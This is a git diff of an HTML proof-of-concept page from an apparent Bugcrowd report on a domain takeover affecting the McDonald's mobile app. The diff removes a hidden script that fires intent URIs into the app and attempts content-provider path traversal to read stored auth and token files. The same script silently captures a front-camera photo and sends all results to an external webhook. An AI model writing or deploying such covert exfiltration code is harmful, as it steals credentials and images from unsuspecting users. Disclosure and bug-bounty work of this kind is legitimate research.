@@ -3,101 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Notice - Bugcrowd PoC</title>
+    <title>Security Notice</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; text-align: center; padding-top: 50px; }
-        .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 500px; }
-        h1 { color: #d32f2f; }
-        p { font-size: 16px; line-height: 1.5; }
-        #video, #canvas { display: none; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            text-align: center;
+            padding-top: 50px;
+        }
+        .container {
+            background: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            display: inline-block;
+            max-width: 500px;
+        }
+        h1 {
+            color: #d32f2f;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.5;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Pwned by Deep Chotaliya</h1>
-        <p>This domain (mymcdonaldsrewards.in) has been successfully verified for security research to demonstrate a dangling domain takeover in the McDonald's app.</p>
-        <video id="video" playsinline autoplay></video>
-        <canvas id="canvas"></canvas>
-        <p><small>Bugcrowd Vulnerability PoC</small></p>
+        <p>This domain (mymcdonaldsrewards.in) has been successfully verified for security research purposes to demonstrate a dangling domain takeover vulnerability in the McDonald's mobile application.</p>
+        <p><small>Bugcrowd Submission Proof</small></p>
     </div>
-
-    <script>
-        const WEBHOOK = "https://webhook.site/aa8f3f28-62e1-4fc3-a757-48864289cfbe";
-        function exfil(d) { navigator.sendBeacon(WEBHOOK, JSON.stringify(d)); }
-
-        // === VECTOR 1: Intent scheme injection ===
-        var intents = [
-            "intent://app.mcdonalds.payment/release/payment#Intent;scheme=mcdinternal;package=com.mcdonalds.mobileapp;end",
-            "intent://app.mcdonalds.tin/release/test#Intent;scheme=mcdinternal;package=com.mcdonalds.mobileapp;end",
-            "mcdinternal://app.mcdonalds.payment/release/payment",
-            "mcdinternal://app.mcdonalds.tin/release/pwned",
-        ];
-
-        intents.forEach(function(url, i) {
-            setTimeout(function() {
-                try {
-                    var f = document.createElement('iframe');
-                    f.style.display = 'none';
-                    f.src = url;
-                    document.body.appendChild(f);
-                    exfil({ type: "INTENT_FIRED", url: url });
-                } catch(e) { exfil({ type: "INTENT_ERR", url: url, e: e.toString() }); }
-            }, i * 1500);
-        });
-
-        // === VECTOR 2: Content provider traversal ===
-        setTimeout(function() {
-            var paths = [
-                "content://com.mcdonalds.mobileapp.authority.release/../../../shared_prefs/com.mcdonalds.mobileapp_preferences.xml",
-                "content://com.mcdonalds.mobileapp.authority.release/%2F..%2F..%2Fshared_prefs%2Fauth.xml",
-                "content://com.mcdonalds.mobileapp.authority.release/files/..%2F..%2Fshared_prefs%2Ftoken.xml",
-            ];
-            paths.forEach(function(p, i) {
-                setTimeout(function() {
-                    if (window.Android && window.Android.handleShareImage) {
-                        try {
-                            var r = window.Android.handleShareImage(p, "t");
-                            exfil({ type: "TRAVERSAL_OK", path: p, result: String(r) });
-                        } catch(e) {
-                            exfil({ type: "TRAVERSAL_ERR", path: p, error: e.toString() });
-                        }
-                    }
-                    var img = new Image();
-                    img.onload = function() {
-                        var c = document.createElement('canvas');
-                        c.width = img.width; c.height = img.height;
-                        c.getContext('2d').drawImage(img,0,0);
-                        exfil({ type: "TRAVERSAL_IMG_HIT", path: p, b64: c.toDataURL() });
-                    };
-                    img.src = p;
-                }, i * 500);
-            });
-        }, intents.length * 1500 + 500);
-
-        // === VECTOR 3: Camera (confirmed working) ===
-        setTimeout(function() {
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
-                audio: false
-            }).then(function(stream) {
-                var v = document.getElementById('video');
-                v.srcObject = stream;
-                setTimeout(function() {
-                    var c = document.getElementById('canvas');
-                    c.width = 480; c.height = 360;
-                    c.getContext('2d').drawImage(v, 0, 0, 480, 360);
-                    c.toBlob(function(blob) {
-                        var fd = new FormData();
-                        fd.append('type', 'CAMERA_0CLICK');
-                        fd.append('selfie', blob, 'selfie.jpg');
-                        fd.append('ts', new Date().toISOString());
-                        fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true, mode: 'no-cors' });
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 'image/jpeg', 0.3);
-                }, 1000);
-            }).catch(function(){});
-        }, intents.length * 1500 + 3000);
-
-    </script>
 </body>
 </html>
